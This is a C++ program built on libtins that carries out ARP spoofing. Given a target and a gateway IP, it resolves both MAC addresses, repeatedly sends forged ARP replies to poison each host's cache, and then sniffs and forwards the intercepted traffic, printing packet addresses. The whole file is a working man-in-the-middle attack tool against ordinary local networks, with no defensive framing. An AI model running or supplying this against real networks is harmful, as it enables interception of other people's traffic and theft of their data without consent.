#define TINS_STATIC
#include<tins/tins.h>
#include<tins/ethernetII.h>
#include<tins/arp.h>
#include<tins/network_interface.h>
#include<tins/utils.h>
#include<tins/packet_sender.h>
#include<tins/tcp_ip/stream_follower.h>
#include<tins/sniffer.h>
#include<iostream>
#include<string>
#include<stdexcept>
#include<WinSock2.h>
#include<IPHlpApi.h>
#include<thread>
#include<mutex>

using namespace Tins;
using std::cout;
using std::endl;
using std::cerr;
using std::to_string;
std::mutex mtx;

enum { CMD, SRC_IP, DEST_IP }; //cmd = 0 source_mac = 1, dest = 2

#pragma comment(lib, "ws2_32.lib")		//winsock2
#pragma comment(lib, "wpcap.lib")		//winpcap
#pragma comment(lib, "iphlpapi.lib")	//get mac
#pragma comment(lib, "tins.lib")

void init() {
#ifdef _WIN32_
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
#endif // _WIN32_
}
void arp_spoofing(NetworkInterface iface, IPv4Address target, IPv4Address gateway, const NetworkInterface::Info& info);
void packet_relay(NetworkInterface iface, IPv4Address target, IPv4Address gateway, NetworkInterface::Info info);
void print(EthernetII eth, IP ip);
EthernetII::address_type tar_mac, gw_mac;
PacketSender sender;


int main(int argc, char* argv[]) {

	IPv4Address t_ip, g_ip;
	if (argc != 3) {
		cout << "Using" << *argv << " <Target IP> <Gateway IP>" << endl;
		return -1;
	}
	try {
		t_ip = argv[SRC_IP];
		g_ip = argv[DEST_IP];
	}
	catch (...) {
		cout << "Invalid ip found .." << endl;
		return 2;
	}

	NetworkInterface iface;
	NetworkInterface::Info info;

	try {
		iface = g_ip;
		info = iface.addresses();
	}
	catch (std::runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}

	try {
		std::thread t(arp_spoofing, iface, t_ip, g_ip, info);
		//std::thread t1(packet_relay, iface, t_ip, g_ip, info);
		packet_relay(iface, t_ip, g_ip, info);
		t.detach();
		//t1.join();


	}
	catch (std::runtime_error& ex) {
		cout << "Runtime error : " << ex.what() << endl;
		return 7;
	}
}

void arp_spoofing(NetworkInterface iface,
					IPv4Address target,
					IPv4Address gateway,
					const NetworkInterface::Info& info) {

	gw_mac	= Utils::resolve_hwaddr(iface, gateway, sender);
	tar_mac	= Utils::resolve_hwaddr(iface, target, sender); //Mac 주소 알아오기

	cout << " Using own IP address     : " << info.ip_addr << endl;
	cout << " Using own hw address     : " << info.hw_addr << endl;
	cout << " Using Gateway hw address : " << gw_mac << endl;
	cout << " Using Target hw address  : " << tar_mac << endl;

	ARP gw_arp(gateway,target, gw_mac, info.hw_addr),		//GW IP		-> Target IP	GW_MAC	->	OWN MAC
		tar_arp(target, gateway, tar_mac, info.hw_addr);	//Target IP	-> GW IP		TAR_MAC	->	OWN_MAC

	gw_arp.opcode(ARP::REPLY);
	tar_arp.opcode(ARP::REPLY);

	EthernetII gw = EthernetII(gw_mac, info.hw_addr) / gw_arp;
	EthernetII tar = EthernetII(tar_mac, info.hw_addr) / tar_arp;

	while (true) {
		mtx.try_lock();
		sender.send(gw, iface);
		sender.send(tar, iface);

		cout << "\t\t****Send ARP Reply****" << "\n";
		mtx.unlock();
		#ifdef _WIN32
			Sleep(5000);
		#else
			sleep(5000);
		#endif
	}
}

void packet_relay(NetworkInterface iface, IPv4Address target, IPv4Address gateway, NetworkInterface::Info info) {
	Sleep(7000);
	Sniffer sniffer(iface.name());
	PDU *pdu;
	while (true) {
		pdu = sniffer.next_packet();
		EthernetII &eth = pdu->rfind_pdu<EthernetII>();
		IP &ip = pdu->rfind_pdu<IP>();
		print(eth, ip);
		if (eth.dst_addr().to_string() == info.hw_addr.to_string() && ip.dst_addr().to_string() == gateway.to_string()) {
			print(eth, ip);
			eth.dst_addr(gw_mac);
		}
		else if (eth.dst_addr().to_string() == info.hw_addr.to_string() && ip.dst_addr().to_string() == target.to_string()) {
			print(eth, ip);
			eth.dst_addr(tar_mac);
		}
		mtx.try_lock();
		pdu->send(sender, iface.name());
		mtx.unlock();
		delete pdu;
	}
}
void print(EthernetII eth, IP ip) {
	cout << "*********************************************\n";
	cout << "Src : " << std::hex << eth.src_addr() << "     " << std::dec << ip.src_addr() << "\n";
	cout << "Dst : " << std::hex << eth.dst_addr() << "     " << std::dec << ip.dst_addr() << "\n";
	cout << "*********************************************\n";
}
